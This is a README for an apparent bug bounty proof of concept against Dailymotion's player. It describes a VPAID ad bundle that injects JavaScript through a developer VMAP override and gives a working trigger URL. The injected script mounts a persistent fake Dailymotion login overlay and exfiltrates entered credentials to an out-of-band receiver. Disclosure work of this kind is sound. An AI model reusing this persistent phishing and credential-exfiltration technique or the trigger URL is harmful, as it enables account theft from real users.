# dm-vpaid-persist-poc

Proof-of-Concept payload files for an authorized bug bounty submission to
Dailymotion's YesWeHack program (PGM-269, handle `ivan0912`).

## What this is

A VPAID 2.0 ad bundle (`vmap.xml` + `vpaid_xss.js`) demonstrating that arbitrary
JavaScript loaded via the player's `dmDevVmapUrl` developer override executes
same-origin inside `geo.dailymotion.com`. The PoC mounts a phishing overlay on
`window.top.document` so the overlay **persists for the entire tab lifetime**
instead of disappearing when the ad iframe is torn down — defeating the
"ad timeout too short" objection raised in the original triage thread.

## Files

- `vmap.xml` — VMAP/VAST 4.2 wrapper, routes the VPAID `MediaFile` to
  `cdn.jsdelivr.net/gh/Ivan09999/dm-vpaid-persist-poc@master/vpaid_xss.js`.
- `vpaid_xss.js` — VPAID 2.0 creative. Implements the full IVPAIDAd interface so
  the player doesn't error out. On `initAd` it appends a Dailymotion-styled
  login overlay to `window.top.document.body` and starts a `MutationObserver`
  that re-appends the overlay if anything removes it. Credentials submitted to
  the form are exfiltrated to an interactsh OOB receiver.

## Trigger

```
https://geo.dailymotion.com/player.html?video=x3rdtfy&dmDevVmapUrl=https://cdn.jsdelivr.net/gh/Ivan09999/dm-vpaid-persist-poc@master/vmap.xml&autoplay=1&mute=1
```

No Dailymotion account required.

## Safe harbor / scope

This repository exists solely to support a YesWeHack bug bounty submission and
is published under the program's safe-harbor terms. The OOB endpoint hard-coded
in the script (`*.oob.static-cdn-eu.com`) is the researcher's own interactsh
instance; no third-party infrastructure is targeted.

Researcher: **ivan0912** (YesWeHack) / **ivani123** (HackerOne).
